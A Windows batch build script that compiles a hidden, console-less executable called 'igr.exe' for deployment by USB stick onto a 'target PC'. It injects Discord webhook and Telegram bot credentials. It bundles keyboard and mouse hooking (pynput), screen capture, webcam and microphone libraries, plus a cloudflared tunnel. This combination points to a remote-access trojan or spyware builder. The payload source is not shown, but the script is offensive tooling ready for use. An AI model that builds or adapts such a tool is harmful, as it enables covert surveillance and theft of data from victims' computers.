@echo off
setlocal enabledelayedexpansion
echo ============================================
echo   IGR Build - Compiling executable
echo ============================================
echo.

REM Check for config.txt
if not exist "config.txt" (
    echo ERROR: config.txt not found!
    echo   Copy config.example.txt to config.txt and fill in your values.
    pause
    exit /b 1
)

REM Read config.txt values
echo [1/5] Reading config.txt...
set "DISCORD_WEBHOOK="
set "DISCORD_USERNAME=IGR"
set "DASHBOARD_PASSWORD="
set "TELEGRAM_BOT_TOKEN="
set "TELEGRAM_CHAT_ID="
set "UPDATE_URL="

for /f "usebackq tokens=1,* delims==" %%a in ("config.txt") do (
    set "line=%%a"
    if not "!line:~0,1!"=="#" (
        if "%%a"=="DISCORD_WEBHOOK" set "DISCORD_WEBHOOK=%%b"
        if "%%a"=="DISCORD_USERNAME" set "DISCORD_USERNAME=%%b"
        if "%%a"=="DASHBOARD_PASSWORD" set "DASHBOARD_PASSWORD=%%b"
        if "%%a"=="TELEGRAM_BOT_TOKEN" set "TELEGRAM_BOT_TOKEN=%%b"
        if "%%a"=="TELEGRAM_CHAT_ID" set "TELEGRAM_CHAT_ID=%%b"
        if "%%a"=="UPDATE_URL" set "UPDATE_URL=%%b"
    )
)

if not defined DISCORD_WEBHOOK (
    echo   WARNING: DISCORD_WEBHOOK is empty in config.txt
)
if not defined DASHBOARD_PASSWORD (
    echo   WARNING: DASHBOARD_PASSWORD is empty in config.txt
)

echo   Config loaded.

REM Create build copy of main.py with injected values
echo.
echo [2/5] Injecting configuration...
copy /y "main.py" "main_build.py" >nul

powershell -Command "(Get-Content 'main_build.py' -Raw) -replace 'BUILD_DISCORD_WEBHOOK', '%DISCORD_WEBHOOK%' -replace 'BUILD_DISCORD_USERNAME', '%DISCORD_USERNAME%' -replace 'BUILD_DASHBOARD_PASSWORD', '%DASHBOARD_PASSWORD%' -replace 'BUILD_TELEGRAM_BOT_TOKEN', '%TELEGRAM_BOT_TOKEN%' -replace 'BUILD_TELEGRAM_CHAT_ID', '%TELEGRAM_CHAT_ID%' -replace 'BUILD_UPDATE_URL', '%UPDATE_URL%' | Set-Content 'main_build.py' -NoNewline"

echo   Values injected.

echo.
echo [3/5] Installing dependencies...
pip install pyinstaller flask requests opencv-python pynput pillow pyaudio cryptography 2>nul
echo   Done.

echo.
echo [4/5] Downloading cloudflared if missing...
if not exist cloudflared.exe (
    echo Downloading cloudflared...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile 'cloudflared.exe'"
    if exist cloudflared.exe (
        echo   Downloaded cloudflared.exe
    ) else (
        echo   WARNING: cloudflared download failed - will auto-download on target PC
    )
) else (
    echo   cloudflared.exe already present
)

echo.
echo [5/5] Compiling igr.exe...
python -m PyInstaller --onefile --noconsole --name igr --clean --noconfirm ^
    --hidden-import flask ^
    --hidden-import requests ^
    --hidden-import pynput.keyboard ^
    --hidden-import pynput.mouse ^
    --hidden-import cv2 ^
    --hidden-import PIL.Image ^
    --hidden-import PIL.ImageTk ^
    --hidden-import PIL.ImageGrab ^
    --hidden-import pyaudio ^
    --hidden-import cryptography ^
    --hidden-import cryptography.hazmat.primitives.ciphers.aead ^
    --hidden-import sqlite3 ^
    main_build.py

REM Clean up build copy
del /f /q "main_build.py" >nul 2>&1

if not exist "dist\igr.exe" (
    echo.
    echo ERROR: Build failed - igr.exe not found in dist\
    pause
    exit /b 1
)

echo.
echo ============================================
echo   BUILD SUCCESSFUL
echo ============================================
echo   Output: dist\igr.exe
echo.
echo   Copy these to USB stick subfiles\ folder:
echo     1. dist\igr.exe
echo     2. cloudflared.exe
echo   And setup.bat to USB root.
echo ============================================
echo.
pause
